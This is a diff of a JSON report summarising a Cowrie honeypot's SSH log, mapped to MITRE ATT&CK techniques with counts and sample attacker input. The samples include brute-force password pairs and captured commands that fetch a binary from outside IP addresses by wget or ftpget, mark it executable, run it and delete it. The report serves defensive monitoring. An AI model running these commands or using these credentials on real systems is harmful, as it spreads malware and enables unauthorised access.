@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-09-08 11:04:12",
+  "generated": "2026-09-08 12:03:45",
   "totals": {
-    "commands": 1718,
-    "login_failed": 2717,
-    "login_success": 521,
-    "sessions": 3041
+    "commands": 1729,
+    "login_failed": 2867,
+    "login_success": 524,
+    "sessions": 3229
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 2717,
+      "count": 2867,
       "examples": [
         "root / test",
         "root / abcd123456",
@@ -21,14 +21,14 @@
         "root / Qweasd123"
       ],
       "first": "2026-09-08T00:00:00.445878Z",
-      "last": "2026-09-08T11:04:10.890191Z",
-      "unique_ips": 67
+      "last": "2026-09-08T12:02:17.319095Z",
+      "unique_ips": 73
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 521,
+      "count": 524,
       "examples": [
         "root / root123456",
         "root / cxlinux",
@@ -37,14 +37,14 @@
         "admin / qwaszxpo"
       ],
       "first": "2026-09-08T00:53:18.216912Z",
-      "last": "2026-09-08T11:03:10.373442Z",
-      "unique_ips": 48
+      "last": "2026-09-08T11:44:15.276635Z",
+      "unique_ips": 51
     },
     {
       "id": "T1222.002",
       "name": "File and Directory Permissions Modification: Linux and Mac",
       "tactic": "Defense Evasion",
-      "count": 128,
+      "count": 129,
       "examples": [
         "(ftpget 185.93.89.72 f ftpget || busybox ftpget 185.93.89.72 f ftpget) > f; chmod 777 f; ./f; rm -rf f",
         "chmod +x clean.sh; sh clean.sh; rm -rf clean.sh; chmod +x setup.sh; sh setup.sh; rm -rf setup.sh; mkdir -p ~/.ssh; chatt",
@@ -53,14 +53,14 @@
         ">/var/d && chmod 777 /var/d && /var/d && cd /var/"
       ],
       "first": "2026-09-08T00:00:01.899754Z",
-      "last": "2026-09-08T10:07:18.179928Z",
-      "unique_ips": 15
+      "last": "2026-09-08T11:16:24.023888Z",
+      "unique_ips": 16
     },
     {
       "id": "T1105",
       "name": "Ingress Tool Transfer",
       "tactic": "Command and Control",
-      "count": 39,
+      "count": 40,
       "examples": [
         "(ftpget 185.93.89.72 f ftpget || busybox ftpget 185.93.89.72 f ftpget) > f; chmod 777 f; ./f; rm -rf f",
         "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
@@ -69,8 +69,8 @@
         "cd /tmp||cd /var/run||cd /mnt||cd /root||cd /;(wget -q -O 1.sh http://198.144.179.82:80/1.sh||busybox wget -q -O 1.sh ht"
       ],
       "first": "2026-09-08T00:00:01.899754Z",
-      "last": "2026-09-08T10:07:18.179928Z",
-      "unique_ips": 12
+      "last": "2026-09-08T11:16:24.023888Z",
+      "unique_ips": 13
     },
     {
       "id": "T1082",
@@ -103,22 +103,23 @@
       "unique_ips": 11
     },
     {
-      "id": "T1059.004",
-      "name": "Command and Scripting Interpreter: Unix Shell",
-      "tactic": "Execution",
-      "count": 3,
-      "examples": [
-        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C\nuname=$(for c in unam",
-        "#!/bin/bash\nset -e\n\n# ==========================================\n# 1. \u57fa\u7840\u914d\u7f6e\u533a (\u9690\u853d\u4f2a\u88c5\u65b9\u6848)\n# ================================="
-      ],
-      "first": "2026-09-08T02:17:18.249790Z",
-      "last": "2026-09-08T08:37:15.106412Z",
-      "unique_ips": 3
-    },
-    {
       "id": "T1083",
       "name": "File and Directory Discovery",
       "tactic": "Discovery",
+      "count": 4,
+      "examples": [
+        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C\nuname=$(for c in unam",
+        "#!/bin/bash\nset -e\n\n# ==========================================\n# 1. \u57fa\u7840\u914d\u7f6e\u533a (\u9690\u853d\u4f2a\u88c5\u65b9\u6848)\n# =================================",
+        "ls /"
+      ],
+      "first": "2026-09-08T02:17:18.249790Z",
+      "last": "2026-09-08T11:41:11.848102Z",
+      "unique_ips": 4
+    },
+    {
+      "id": "T1059.004",
+      "name": "Command and Scripting Interpreter: Unix Shell",
+      "tactic": "Execution",
       "count": 3,
       "examples": [
         "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C\nuname=$(for c in unam",
@@ -181,15 +182,15 @@
   "unmapped": [
     [
       "shell",
-      463
+      465
     ],
     [
       "sh",
-      463
+      465
     ],
     [
       "system",
-      459
+      460
     ],
     [
       "echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\"",
@@ -209,7 +210,7 @@
     ],
     [
       "enable",
-      13
+      14
     ],
     [
       "cd /proc && cat self/cmdline",
